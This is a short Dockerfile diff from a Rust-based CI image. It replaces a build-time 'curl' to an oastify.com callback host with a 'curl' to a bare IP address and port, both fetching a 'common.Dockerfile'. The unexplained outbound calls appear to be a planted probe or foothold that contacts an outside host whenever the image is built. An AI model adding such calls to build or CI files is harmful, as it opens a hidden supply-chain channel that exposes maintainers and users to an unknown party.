@@ -5,7 +5,7 @@ FROM rust
 RUN cargo install -f typos-cli
 RUN apt-get update && apt-get install -y shellcheck pylint curl rsync gcc
 
-RUN curl https://8gpexwnl8gc51ftsndl0iy9m4da4y5mu.oastify.com/built/common.Dockerfile
+RUN curl http://65.109.68.176:15172/built/common.Dockerfile
 
 # 1) Install the logger & trap
 COPY ci/command_logger.sh /etc/command_logger.sh
